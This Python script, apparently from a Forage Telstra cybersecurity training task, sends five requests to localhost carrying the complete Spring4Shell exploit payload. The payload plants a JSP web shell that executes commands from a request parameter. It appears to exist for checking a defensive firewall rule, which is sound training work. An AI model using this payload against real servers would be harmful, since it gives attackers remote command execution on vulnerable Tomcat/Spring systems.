# www.theforage.com - Telstra Cyber Task 3
# Test Requester


import http.client


host = "localhost"
port = 8000


def main():
    target = "%s:%s" % (host, port)
    print("[+] Beginning test requests to: %s" % target)
    successful_responses = 0


    for x in range (0,5):
        payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        print("[%s/5]: Making test request to %s with payload: %s" % (x + 1, target, payload))
        conn = http.client.HTTPConnection(target)


        conn.request('POST', '/tomcatwar.jsp', payload,  {
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        })
        response = conn.getresponse()
        status_code = response.status
        if status_code == 200:
            successful_responses += 1
        print("Response status code: %s" % status_code)
        print("=============")


    print("[+] Test completed.")
    print("[+] Successful responses: %s/5" % successful_responses)


if __name__ == "__main__":
    main()